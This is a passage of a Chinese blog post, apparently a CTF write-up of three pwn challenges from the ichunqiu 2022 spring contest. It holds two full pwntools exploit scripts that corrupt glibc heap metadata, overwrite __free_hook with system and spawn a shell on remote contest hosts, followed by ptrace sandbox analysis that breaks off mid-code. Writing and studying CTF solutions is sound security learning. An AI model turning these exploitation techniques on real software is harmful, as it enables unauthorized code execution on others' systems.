@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.1">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>ichunqiu2022春季赛勇者赛道pwn - 1m0tfl</title>
+
+  
+    <meta name="description" content="ichunqiu2022春季赛勇者赛道的pwn题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ichunqiu2022春季赛勇者赛道pwn">
+<meta property="og:url" content="https://www.tmotfl.top/2022/05/12/ichunqiu2022%E6%98%A5%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E8%B5%9B%E9%81%93pwn/index.html">
+<meta property="og:site_name" content="1m0tfl">
+<meta property="og:description" content="ichunqiu2022春季赛勇者赛道的pwn题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-12T13:52:05.000Z">
+<meta property="article:modified_time" content="2022-05-12T13:57:13.292Z">
+<meta property="article:author" content="1m0tfl">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/xxy1126.github.io/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/xxy1126.github.io/about/"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://avatars.githubusercontent.com/u/36330256?s=400&u=6a1ecd579f578df9afac5d18f47780fb6ee8c083&v=4" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/xxy1126.github.io/"><div class="main">1m0tfl</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/xxy1126.github.io/">文章</a><a class="nav-item" href="/xxy1126.github.io/friends/">友链</a><a class="nav-item" href="/xxy1126.github.io/about/">关于</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#chunzhiIot"><span class="toc-text">chunzhiIot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#torghast"><span class="toc-text">torghast</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sandbox"><span class="toc-text">sandbox</span></a></li></ol></div></div></div>
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/xxy1126.github.io/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/xxy1126.github.io/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/xxy1126.github.io/categories/wp/">wp</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-05-12T13:52:05.000Z">2022-05-12</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>ichunqiu2022春季赛勇者赛道pwn</span></h1>
+<p>ichunqiu2022春季赛勇者赛道的pwn题</p>
+<span id="more"></span> 
+<h2 id="chunzhiIot"><a href="#chunzhiIot" class="headerlink" title="chunzhiIot"></a>chunzhiIot</h2><p>近期分析过挺多这种<code>httpd</code>类型的题目, 这个题目其实是个堆题, 外面套了一层iot而已. </p>
+<p><code>sub_1852</code>函数是用来解析请求的, <code>sub_15FD</code>函数是用来处理请求中的操作(createm delete show edit之类)</p>
+<p><code>sub_15FD</code>函数<code>POST</code>操作需要<code>dword_403C==1</code>才有效, 查看交叉引用发现是一个登录功能, <code>method=DEV</code>的时候传入<code>rotartsinimda</code>进行登录</p>
+<p>绕过<code>safe-linking</code> 改<code>freehook</code> 为<code>system</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size , content</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;\x01&amp;&#x27;</span>+<span class="built_in">str</span>(idx)+<span class="string">&#x27;&amp;&#x27;</span>+<span class="built_in">str</span>(size)+<span class="string">&#x27;&amp;&#x27;</span>+content +<span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">    wrapper(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span> </span><br><span class="line">    payload = <span class="string">&#x27;\x02&amp;&#x27;</span>+<span class="built_in">str</span>(idx)+<span class="string">&#x27;&amp;&#x27;</span>+content</span><br><span class="line">    wrapper(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;\x03&amp;&#x27;</span>+<span class="built_in">str</span>(idx)+<span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">    wrapper(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    payload = <span class="string">&#x27;\x04&amp;&#x27;</span>+<span class="built_in">str</span>(idx)+<span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">    wrapper(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">content</span>):</span> </span><br><span class="line">    payload = <span class="string">&quot;POST / HTTP/1.0\r\n&quot;</span> </span><br><span class="line">    payload += content</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Waiting Package...\n&#x27;</span>, payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span> </span><br><span class="line">    payload = <span class="string">&quot;DEV / HTTP/1.0\r\n&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;rotartsinimda&quot;</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Waiting Package...\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;123.56.165.31&#x27;</span>, <span class="number">15757</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">login()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>): </span><br><span class="line">    create(i, <span class="number">0x80</span>, <span class="built_in">str</span>(i)*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;1motfl&#x27;</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>): </span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0c61</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase:&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">heapbase = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heapbase:&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heapbase)))</span><br><span class="line"></span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(freehook^(heapbase&gt;&gt;<span class="number">12</span>)))</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="torghast"><a href="#torghast" class="headerlink" title="torghast"></a>torghast</h2><p>功能很多, 一个一个分析, 发现新增<code>user</code>和<code>select user</code>必须要先通过<code>challenge</code>. (就是exp里的login)</p>
+<p>如何通过<code>challenge</code>: 把其中一个减到负数即可绕过,<code>diary</code>可以用来泄露信息. </p>
+<p>有个<code>offbynull</code>, 本来想直接开始利用各种残留构造了, 发现堆块数量限制0x10. </p>
+<p>想了想可以根据残留数据泄露出<code>libcbase</code>和<code>heapbase</code>. </p>
+<p>有了<code>heapbase</code>就可以伪造<code>fake chunk</code>的<code>fd</code>和<code>bk</code>为<code>fakechunk</code>地址, 绕过<code>unsortedbin</code>向前合并时候的<code>unlink</code>检测, 造成堆块重叠. </p>
+<p>(需要注意<code>fake chunk</code>的 <code>fd_nextsize</code>一定要为空, 刚开始写入了<code>\x0a</code>, 没注意, 源码调试发现进入了<code>largebin unlink</code>的分支)</p>
+<p>之后修改<code>tcache</code>中的<code>fd</code>指针为<code>freehook</code>, 从而改<code>freehook</code>为<code>system</code>. </p>
+<p>可惜慢了两分钟</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(Only GM)\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">joingame</span>():</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span> </span><br><span class="line">    joingame()</span><br><span class="line">    magic(<span class="number">1</span>) </span><br><span class="line">    magic(<span class="number">3</span>)</span><br><span class="line">    magic(<span class="number">3</span>)</span><br><span class="line">    magic(<span class="number">3</span>)</span><br><span class="line">    magic(<span class="number">3</span>)</span><br><span class="line">    magic(<span class="number">1</span>) </span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    magic(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size, content</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Id\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Size\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data\n&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Log:&#x27;</span>, content)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeto</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx, leak</span>):</span> </span><br><span class="line">    base = <span class="number">0</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> leak == <span class="number">1</span>: </span><br><span class="line">        base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) </span><br><span class="line">    <span class="keyword">elif</span> leak == <span class="number">2</span>: </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">        base = u64(p.recvuntil(<span class="string">&#x27;\x00&#x27;</span>, drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Menu\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;123.57.174.66&#x27;</span>, <span class="number">24262</span>)</span><br><span class="line"></span><br><span class="line">login() </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x4f0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">changeto(<span class="number">1</span>)</span><br><span class="line">heapbase = show(<span class="number">1</span>, <span class="number">2</span>) - <span class="number">0x2d0</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heapbase)))</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">changeto(<span class="number">3</span>)</span><br><span class="line">libcbase = show(<span class="number">1</span>, <span class="number">1</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x490</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">6</span> ,<span class="number">0x4f0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x530</span>))</span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x530</span>)+p64(heapbase+<span class="number">0x810</span>)*<span class="number">2</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0x520</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(freehook))</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x20</span>, p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><p>做这个题需要先了解<code>ptrace</code>系统调用相关知识, 这个题目是利用<code>ptrace</code>实现的<code>sandbox</code> </p>
+<p>关于<code>ptrace</code>可以参考: <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-265599.htm">https://bbs.pediy.com/thread-265599.htm</a></p>
+<p>关于<code>ptrace</code>实现<code>sandbox</code>可以参考Plaid2020的一个题目: <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/20115">https://ctftime.org/writeup/20115</a></p>
+<p><code>ptrace</code>系统调用原型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid,<span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过<code>man ptrace</code>可以查看<code>ptrace</code>的基本信息 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">The  <span class="title">ptrace</span><span class="params">()</span>  system  call provides a means by which one <span class="title">process</span> <span class="params">(the <span class="string">&quot;tracer&quot;</span>)</span></span></span><br><span class="line"><span class="function">may observe <span class="keyword">and</span> control the execution of another <span class="title">process</span> <span class="params">(the <span class="string">&quot;tracee&quot;</span>)</span>, <span class="keyword">and</span> ex‐</span></span><br><span class="line"><span class="function">amine <span class="keyword">and</span> change the tracee&#x27;s memory <span class="keyword">and</span> registers.  It is primarily used to im‐</span></span><br><span class="line"><span class="function">plement breakpoint debugging <span class="keyword">and</span> system call tracing.</span></span><br></pre></td></tr></table></figure>
+<p><code>ptrace</code>系统调用提供了一种<code>tracer</code>进程观察和控制<code>tracee</code>进程的方法, <code>tracer</code>进程可以通过<code>ptrace</code>系统调用检查和改变<code>tracee</code>的内存和寄存器. </p>
+<p>主要用于实现断点调试和系统调用追踪.这个题目就是利用<code>ptrace</code>的系统调用追踪, 来实现<code>sandbox</code>. </p>
+<p>对着IDA代码来进行分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__pid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">reg</span>;</span> <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+DFh] [rbp-31h]</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+E0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+E4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlimits</span>;</span> <span class="comment">// [rsp+E8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> **v10; <span class="comment">// [rsp+F8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> **v11; <span class="comment">// [rsp+100h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v12 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  rlimits.rlim_cur = <span class="number">104857600LL</span>;</span><br><span class="line">  rlimits.rlim_max = <span class="number">104857600LL</span>;</span><br><span class="line">  setrlimit(RLIMIT_AS, &amp;rlimits);</span><br><span class="line">  pid = fork(); <span class="comment">//fork 子进程</span></span><br><span class="line">  <span class="keyword">if</span> ( pid ) <span class="comment">//父进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( waitpid(pid, &amp;stat_loc, <span 